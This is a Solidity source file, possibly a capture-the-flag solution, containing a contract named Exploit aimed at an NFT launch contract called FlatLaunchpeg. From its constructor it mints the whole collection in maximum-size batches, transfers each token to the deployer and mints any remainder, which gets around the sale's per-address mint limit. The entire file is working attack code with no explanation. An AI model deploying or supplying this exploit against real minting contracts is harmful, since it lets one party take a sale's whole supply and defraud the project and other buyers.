// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
interface IFlatLaunchpeg {
    function publicSaleMint(uint256 _quantity) external payable;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external returns (uint256);
    function maxPerAddressDuringMint() external returns (uint256);
    function collectionSize() external returns (uint256);
    function maxBatchSize() external returns (uint256);
}

contract Exploit {
    constructor(address flatLaunchpegAddress) {
        IFlatLaunchpeg flatlaunchpeg = IFlatLaunchpeg(flatLaunchpegAddress);
        
        uint tokenid = flatlaunchpeg.totalSupply();
        uint maxBatchSize = flatlaunchpeg.maxBatchSize();
        uint collectionSize = flatlaunchpeg.collectionSize();
        uint loopMintAmount = collectionSize / maxBatchSize;

        
       
        for (uint256 i=0; i<loopMintAmount; i++) {
            uint transferNum = 0;
            flatlaunchpeg.publicSaleMint(maxBatchSize);
           
            while(transferNum < maxBatchSize) {
                flatlaunchpeg.transferFrom(address(this), msg.sender, tokenid++);    
                transferNum++;
            }
        }
        
        if(flatlaunchpeg.totalSupply() != collectionSize) {
            uint transferNum = 0;
            uint remainingNftNum = collectionSize - flatlaunchpeg.totalSupply();
            
            flatlaunchpeg.publicSaleMint(remainingNftNum);
            while(transferNum < remainingNftNum) {
                flatlaunchpeg.transferFrom(address(this), msg.sender, tokenid++);
                transferNum++;
            }
        }
    }
} 
  